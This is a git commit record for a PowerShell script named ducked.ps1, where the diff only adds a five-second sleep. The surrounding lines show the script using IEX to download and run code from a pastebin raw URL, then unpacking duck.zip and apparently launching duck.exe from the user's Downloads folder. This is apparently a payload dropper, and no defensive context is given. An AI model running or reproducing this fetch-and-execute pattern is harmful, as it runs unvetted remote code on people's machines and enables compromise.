ef60dd46071492b615ff4525c58e7574e96d3ab9
jelpsIT <106605874+jelpsIT@users.noreply.github.com>
2023-06-02 15:16:25 +0100

    Update ducked.ps1

--- ducked.ps1
+++ ducked.ps1
@@ -1,6 +1,6 @@
 IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/FWWk5dCE') -Force
 Expand-Archive -Path "$env:USERPROFILE/Downloads/duck.zip" -DestinationPath "$env:USERPROFILE/Downloads/duck" -Force
-
+Start-Sleep -s 5
 $processName = "$env:USERPROFILE\Downloads\duck\duck\duck.exe"
 $running = $true
 
